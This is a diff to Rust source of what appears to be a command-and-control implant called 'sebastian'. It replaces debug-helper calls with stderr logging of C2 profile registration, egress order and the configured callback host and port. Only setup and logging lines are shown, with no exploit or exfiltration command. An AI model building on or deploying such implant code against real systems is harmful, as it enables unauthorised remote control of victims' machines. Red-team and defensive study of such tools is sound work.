@@ -121,7 +121,7 @@ pub fn initialize() {
     });
     FAILED_CONNECTION_THRESHOLD.store(threshold, std::sync::atomic::Ordering::Relaxed);
 
-    utils::print_debug(&format!("Initial egress order: {:?}", order));
+    eprintln!("[sebastian] Initial egress order: {:?}", order);
 
     // Register C2 profiles from compile-time config env vars
     // Each env var is base64-encoded JSON set by builder.go during payload build
@@ -156,10 +156,15 @@ fn decode_profile_config<T: serde::de::DeserializeOwned>(
 fn register_profiles_from_config<E: base64::Engine>(_engine: &E) {
     // HTTP profile
     if let Some(config_b64) = option_env!("C2_HTTP_INITIAL_CONFIG") {
+        eprintln!("[sebastian] Found HTTP config, decoding...");
         if let Some(config) = decode_profile_config::<http::HttpInitialConfig>(config_b64, "http") {
-            utils::print_debug("Registering HTTP profile");
+            eprintln!("[sebastian] Registering HTTP profile -> {}:{}", config.callback_host, config.callback_port);
             register_available_c2_profile(Arc::new(http::HttpProfile::new(config)));
+        } else {
+            eprintln!("[sebastian] FAILED to decode HTTP config");
         }
+    } else {
+        eprintln!("[sebastian] No C2_HTTP_INITIAL_CONFIG found at compile time");
     }
 
     // Websocket profile
@@ -221,7 +226,8 @@ pub async fn start() {
         }
     }
     *egress_order = installed_c2.clone();
-    utils::print_debug(&format!("Fixed egress order: {:?}", egress_order));
+    eprintln!("[sebastian] Fixed egress order: {:?}", *egress_order);
+    eprintln!("[sebastian] Registered profiles: {:?}", profiles.keys().collect::<Vec<_>>());
 
     // Start first matching egress profile
     let current_id = CURRENT_CONNECTION_ID.load(std::sync::atomic::Ordering::Relaxed) as usize;
@@ -229,7 +235,7 @@ pub async fn start() {
         if i == current_id {
             if let Some(profile) = profiles.get(egress_c2) {
                 if !profile.is_p2p() {
-                    utils::print_debug(&format!("Starting: {}", egress_c2));
+                    eprintln!("[sebastian] Starting egress profile: {}", egress_c2);
                     let p = profile.clone();
                     tokio::spawn(async move {
                         p.start().await;
